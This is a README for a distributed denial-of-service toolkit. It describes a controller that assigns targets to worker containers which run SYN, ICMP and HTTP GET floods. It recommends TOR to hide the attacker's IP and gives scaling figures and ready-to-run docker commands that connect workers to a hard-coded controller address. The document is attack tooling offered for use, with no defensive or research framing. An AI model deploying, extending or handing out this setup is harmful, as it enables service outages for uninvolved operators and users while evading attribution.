# Preparations
- Port scanner

# Attacks
#### DoS:
- SYN flood
- Ping (ICMP) flood
- HTTP GET flood

# General concept
The controller keeps track of current targets
Workers connect to contoller and ask him what to do. 

### Workers:
We currently provide 2 different type of workers that will perform the attack:

Haru - runs only HTTP flood attack, but it's very good at it, with heavy parallelization it can spam a huge amount of requests. It also includes TOR pre-installed in the docker container, so you can avoid exposing your worker's real IP address and run all requests through TOR proxy. If your machine is powerful enough you can run multiple replicas of this worker. We tested around 6 replicas on 2vCPU worked fine, and 30-40 replicas on 12vCPU.  

Aiko - combines SYN flood, ICMP flood and HTTP flood attacks in one container. The http flood portion of it is not as powerful as Haru's version, and there's no support for TOR this time. This worker is also extremely CPU intensive, it can load CPU up to 100% on small virtual machines with just one replica of the container running. 


# Run
#### Worker AIKO
```shell script
docker run --name=rvkinh-service-worker-aiko --rm -tid -e CLUSTER_ID=temp_c -e WORKER_ID=temp_w -e CONTROLLER_URL=http://142.93.38.82:8888 jpleorx/rvkinh-worker-aiko:latest
```

#### Worker HARU
```shell script
docker run --name=rvkinh-service-worker-haru --rm -tid -e CLUSTER_ID=temp_c -e WORKER_ID=temp_w -e CONTROLLER_URL=http://142.93.38.82:8888 jpleorx/rvkinh-worker-haru:latest
```

#### Controller
```shell script
docker run --name=rvkinh-service-controller --rm -tid -p 8888:8888 jpleorx/rvkinh-controller:latest
```

#### Web UI
```shell script
docker run --name=rvkinh-service-controller --rm -tid -p 8888:8888 jpleorx/rvkinh-ui:latest
```

